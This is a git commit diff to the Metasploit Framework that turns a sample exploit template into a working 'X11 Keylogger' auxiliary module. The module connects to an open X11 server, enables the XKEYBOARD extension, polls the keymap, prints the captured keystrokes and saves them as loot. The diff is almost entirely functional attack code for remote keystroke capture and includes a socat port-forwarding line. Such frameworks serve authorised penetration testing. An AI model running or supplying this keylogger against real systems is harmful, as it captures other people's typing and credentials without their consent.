e7ca9485ed114f3219167f965a36fd1009400fa3
h00die <michaeltcyr@gmail.com>
2024-02-22 15:34:20 -0500

    working xspy code

--- modules/auxiliary/gather/x11_keyboard_spy.rb
+++ modules/auxiliary/gather/x11_keyboard_spy.rb
@@ -3,89 +3,82 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-###
-#
-# This exploit sample shows how an exploit module could be written to exploit
-# a bug in an arbitrary TCP server.
-#
-###
 class MetasploitModule < Msf::Auxiliary
   include Exploit::Remote::Tcp
   include Exploit::Remote::X11
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(
       update_info(
         info,
-        # The Name should be just like the line of a Git commit - software name,
-        # vuln type, class. Preferably apply
-        # some search optimization so people can actually find the module.
-        # We encourage consistency between module name and file name.
-        'Name' => 'Sample Exploit',
+        'Name' => 'X11 Keylogger',
         'Description' => %q{
-          This exploit module illustrates how a vulnerability could be exploited
-          in an TCP server that has a parsing bug.
+          This module binds to an open X11 host to log keystrokes. This is a fairly
+          close copy of the old xspy c program which has been on Kali for a long time.
+          The module works by connecting to the X11 session, creating a background
+          window, binding a keyboard to it and creating a notification alert when a key
+          is pressed.
+
+          One of the major limitations of xspy, and thus this module, is that it polls
+          at a very fast rate, faster than a key being pressed is released (especiall before
+          the repeat delay is hit). To combat printing multiple characters for a single key
+          press, repeat characters arent printed. If a repeat character is pressed on the
+          keyboard, it will unfortunately be ignored.
 
           socat -d -d TCP-LISTEN:6000,fork,bind=127.0.0.1 UNIX-CONNECT:/tmp/.X11-unix/X1
         },
         'License' => MSF_LICENSE,
-        'Author' => ['skape'],
-        'References' => [
-          [ 'OSVDB', '12345' ],
-          [ 'EDB', '12345' ],
-          [ 'URL', 'http://www.example.com'],
-          [ 'CVE', '1978-1234']
+        'Author' => [
+          'h00die', # MSF module, X11 libs
+          'nir tzachar' # original file? https://gitlab.com/kalilinux/packages/xspy/-/blob/kali/master/Xspy.c?ref_type=heads
         ],
-        'Payload' => {
-          'Space' => 1000,
-          'BadChars' => "\x00"
-        },
+        'References' => [
+          [ 'URL', 'https://www.kali.org/tools/xspy/'],
+          [ 'CVE', '1999-0526']
+        ],
         'DefaultOptions' => {
           'RPORT' => 6000
         },
-        'DisclosureDate' => '2020-12-30',
-        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
-        # It's generally easiest just to put the default at the beginning of the list and skip this
-        # entirely.
-        'DefaultTarget' => 0,
-        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
+        'DisclosureDate' => '1997-07-01', # CVE date, but likely older
         'Notes' => {
-          'Stability' => [],
+          'Stability' => [CRASH_SAFE],
           'Reliability' => [],
           'SideEffects' => [],
           'AKA' => ['xspy']
         }
       )
     )
+    register_options [
+      OptInt.new('ListenerTimeout', [ true, 'The maximum number of seconds to keylog', 600 ]) # 10minutes
+    ]
   end
 
-  #
-  # The sample exploit just indicates that the remote host is always
-  # vulnerable.
-  #
   def check
-    CheckCode::Vulnerable
-  end
-
-  def print_packet(packet)
-    c = 0
-    packet.each_char do |byte|
-      puts "#{c} -> #{byte.inspect}"
-      c += 1
+    vprint_status('Establishing TCP Connection')
+    connect # tcp connection establish
+    vprint_status('Attempting X11 connection')
+    sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish
+    connection = process_initial_connection_response(sock.get_once(-1, 1))
+    if connection.success == 1
+      return Exploit::CheckCode::Appears('Successfully established X11 connection')
     end
+
+    Exploit::CheckCode::Safe('X11 connection was not successful')
   end
 
   def process_initial_connection_response(packet)
-    connection = X11CONNECTION.read(packet)
-    if connection.success == 1
-      print_good('Successly established X11 connection')
-    else
-      fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to establish an X11 connection')
+    begin
+      connection = X11CONNECTION.read(packet)
+    rescue EOFError
+      vprint_bad("Connection packet malfored (size: #{packet.length}), attempting to get read more data")
+      packet += sock.get_once(-1, 1)
+      begin
+        connection = X11CONNECTION.read(packet)
+      rescue StandardError
+        fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to parse X11 connection initialization response packet')
+      end
     end
-    vprint_status("Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
-    vprint_status("Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
-    vprint_status("Resource ID: #{connection.resource_id_base.inspect}")
-    vprint_status("Screen root: #{connection.screen_root.inspect}")
     connection
   end
 
@@ -93,7 +86,8 @@ class MetasploitModule < Msf::Auxiliary
     begin
       extension_response = QUERYEXTENSIONRESPONSE.read(packet)
     rescue ::EOFError
-      fail_with(Msf::Module::Failure::UnexpectedReply, packet)
+      packet += sock
+      fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to process QueryExtension Response. Raw packet: #{packet}")
     end
 
     if extension_response.present == 1
@@ -136,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
     key_map
   end
 
-  # TBH still don't really understand how this works, but it does.
+  # TBH still don't really understand exactly how this works, but it does.
   def print_keystroke(bit_array_of_keystrokes, key_map)
     # Iterate through each byte of keyboard state
     32.times do |i|
@@ -147,49 +141,65 @@ class MetasploitModule < Msf::Auxiliary
         # Key at position (i*8 + j) is pressed
         keycode = i * 8 + j
         keysym = key_map[keycode]
-        # puts "Key with keycode #{keycode} is #{keysym}"
+
         print_line(keysym) unless @previous_character == keysym
+        @keylogger_log += keysym unless @previous_character == keysym
+
         @previous_character = keysym
       end
     end
   end
 
-  # caps lock
-  # L shift
-
   def run
     query_extension_calls = 0
+    @keylogger_log = ''
+
     vprint_status('Establishing TCP Connection')
     connect # tcp connection establish
     vprint_status('(1/9) Establishing X11 connection')
     sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish
     connection = process_initial_connection_response(sock.get_once(-1, 1))
-    sock.get_once(-1, 1) # make sure we dont have anything else waiting
+    if connection.success == 1
+      print_good('Successly established X11 connection')
+    else
+      fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to establish an X11 connection')
+    end
+    vprint_status("Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
+    vprint_status("Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
+    vprint_status("Resource ID: #{connection.resource_id_base.inspect}")
+    vprint_status("Screen root: #{connection.screen_root.inspect}")
+
     vprint_status('(2/9) Checking on BIG-REQUESTS extension')
     sock.put(QUERYEXTENSION.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
     query_extension_calls += 1
     big_requests_plugin = process_extension_query(sock.get_once(-1, 1), 'BIG-REQUESTS')
+
     vprint_status('(3/9) Enabling BIG-REQUESTS')
     sock.put(EXTENSIONTOGGLE.new(opcode: big_requests_plugin.major_opcode).to_binary_s) # not sure why we do this
     sock.get_once(-1, 1)
+
     vprint_status('(4/9) Creating new graphical context')
     sock.put(X11CREATEGRAPHICALCONTEXTREQUEST.new(cid: connection.resource_id_base,
                                                   drawable: connection.screen_root,
                                                   gc_value_mask_background: 1).to_binary_s +
              X11GETPROPERTY.new(window: connection.screen_root).to_binary_s) # not sure why we do this
     sock.get_once(-1, 1)
+
     vprint_status('(5/9) Checking on XKEYBOARD extension')
     sock.put(QUERYEXTENSION.new(extension: 'XKEYBOARD', unused2: query_extension_calls).to_binary_s) # check if XKEYBOARD exist, not sure why
     xkeyboard_plugin = process_extension_query(sock.get_once(-1, 1), 'XKEYBOARD')
+
     vprint_status('(6/9) Enabling XKEYBOARD')
     sock.put(EXTENSIONTOGGLE.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
     sock.get_once(-1, 1)
+
     vprint_status('(7/9) Requesting XKEYBOARD map')
     sock.put(GETMAPREQUEST.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                full_key_types: 1,
                                full_key_syms: 1,
                                full_modifier_map: 1).to_binary_s) # not sure what this does
     map_data = GETMAPREPLY.read(sock.get_once(-1, 1))
+
     vprint_status('(8/9) Enabling notification on keyboard and map')
     sock.put(SELECTEVENTS.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                               affect_which_new_keyboard_notify: 1,
@@ -204,18 +214,42 @@ class MetasploitModule < Msf::Auxiliary
                              map_key_syms: 1,
                              map_modifier_map: 1).to_binary_s) # not sure what this does
     sock.get_once(-1, 1)
-    vprint_status('(9/9) Creating local keyboard map')
 
+    vprint_status('(9/9) Creating local keyboard map')
     key_map = build_sym_key_map(map_data)
 
     print_good('All setup, watching for keystrokes')
     @previous_character = ''
-    loop do
-      sock.put(QUERYKEYMAPREQUEST.new.to_binary_s)
-      bit_array_of_keystrokes = QUERYKEYMAPREPLY.read(sock.get_once(-1, 1)).data
-      next if bit_array_of_keystrokes.all?(0)
+    # loop mechanics stolen from exploit/multi/handler
+    stime = Time.now.to_f
+    timeout = datastore['ListenerTimeout'].to_i
+    begin
+      loop do
+        break if timeout > 0 && (stime + timeout < Time.now.to_f)
 
-      print_keystroke(bit_array_of_keystrokes, key_map)
+        Rex.sleep(0.00001) # https://gitlab.com/kalilinux/packages/xspy/-/blob/kali/master/Xspy.c?ref_type=heads#L79
+        sock.put(QUERYKEYMAPREQUEST.new.to_binary_s)
+        bit_array_of_keystrokes = QUERYKEYMAPREPLY.read(sock.get_once(-1, 1)).data
+
+        print_keystroke(bit_array_of_keystrokes, key_map)
+      end
+    ensure
+      vprint_status('Closing X11 connection')
+      sock.put(X11FREEGRAPHICALCONTEXTREQUEST.new(gc: connection.resource_id_base).to_binary_s +
+        X11GETINPUTFOCUSREQUEST.new.to_binary_s)
+
+      unless @keylogger_log == ''
+        loot_path = store_loot(
+          'x11.keylogger',
+          'text/plain',
+          datastore['rhost'],
+          @keylogger_log,
+          'xspy.txt',
+          'Keylogger content from X11'
+        )
+
+        print_good("Logged keys stored to: #{loot_path}")
+      end
     end
   end
 end
